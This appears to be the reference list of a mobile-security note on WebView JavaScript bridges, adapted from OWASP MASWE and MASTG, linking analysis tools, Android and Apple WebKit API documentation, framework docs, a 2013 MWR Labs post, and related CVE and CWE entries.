- OWASP MASTG tools: [semgrep (MASTG-TOOL-0110)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/), [radare2 (MASTG-TOOL-0073)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/), [Frida (MASTG-TOOL-0031)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0031/), [jadx (MASTG-TOOL-0018)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/), [Apktool (MASTG-TOOL-0011)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0011/), [GlobalWebInspect (MASTG-TOOL-0137)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0137/), [ElleKit (MASTG-TOOL-0139)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0139/) (CC BY-SA 4.0)
- Android Developers: [Access native APIs with JavaScript bridge](https://developer.android.com/develop/ui/views/layout/webapps/native-api-access-jsbridge), [Insecure WebView native bridges](https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges), [`WebViewCompat`](https://developer.android.com/reference/androidx/webkit/WebViewCompat) (`addWebMessageListener`, `postWebMessage`, `addDocumentStartJavaScript`), [`JavaScriptExecutionWorld`](https://developer.android.com/reference/androidx/webkit/JavaScriptExecutionWorld), [`WebView.addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface%28java.lang.Object,java.lang.String%29), [`@JavascriptInterface`](https://developer.android.com/reference/android/webkit/JavascriptInterface), [`WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader), [Cross-app scripting](https://developer.android.com/privacy-and-security/risks/cross-app-scripting); Google Play Help: [remediation for JavaScript interface injection](https://support.google.com/faqs/answer/9095419)
- Chrome for Developers: [Remote debug WebViews](https://developer.chrome.com/docs/devtools/remote-debugging/webviews)
- Apple: [`WKUserContentController`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller), [`add(_:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/add%28_:name:%29), [`WKScriptMessageHandler`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandler), [`WKScriptMessageHandlerWithReply`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandlerwithreply), [`WKScriptMessage`](https://developer.apple.com/documentation/webkit/wkscriptmessage), [`WKFrameInfo`](https://developer.apple.com/documentation/webkit/wkframeinfo), [`WKUserScript`](https://developer.apple.com/documentation/webkit/wkuserscript), [`WKContentWorld`](https://developer.apple.com/documentation/webkit/wkcontentworld), [`evaluateJavaScript(_:in:in:completionHandler:)`](https://developer.apple.com/documentation/webkit/wkwebview/evaluatejavascript%28_:in:in:completionhandler:%29), [`callAsyncJavaScript(_:arguments:in:in:completionHandler:)`](https://developer.apple.com/documentation/webkit/wkwebview/callasyncjavascript%28_:arguments:in:in:completionhandler:%29), [`isInspectable`](https://developer.apple.com/documentation/webkit/wkwebview/isinspectable), [Inspecting iOS and iPadOS](https://developer.apple.com/documentation/safari-developer-tools/inspecting-ios); WebKit blog: [Enabling the Inspection of Web Content in Apps](https://webkit.org/blog/13936/enabling-the-inspection-of-web-content-in-apps/), [App-Bound Domains](https://webkit.org/blog/10882/app-bound-domains/)
- Framework documentation: [Apache Cordova (config.xml, allow-list)](https://cordova.apache.org/docs/en/latest/config_ref/), [Capacitor configuration](https://capacitorjs.com/docs/config), [react-native-webview reference](https://github.com/react-native-webview/react-native-webview/blob/master/docs/Reference.md), [webview_flutter](https://pub.dev/packages/webview_flutter)
- MWR Labs (now Reversec): [WebView addJavascriptInterface Remote Code Execution](https://labs.reversec.com/posts/2013/09/webview-addjavascriptinterface-remote-code-execution) (2013)
- CVE: [CVE-2012-6636](https://nvd.nist.gov/vuln/detail/CVE-2012-6636), [CVE-2014-1939](https://nvd.nist.gov/vuln/detail/CVE-2014-1939)
- CWE: [CWE-749](https://cwe.mitre.org/data/definitions/749.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html)

> Adapted and extended from the OWASP MASWE and MASTG (https://mas.owasp.org), licensed under CC BY-SA 4.0. This note is distributed under the same licence.
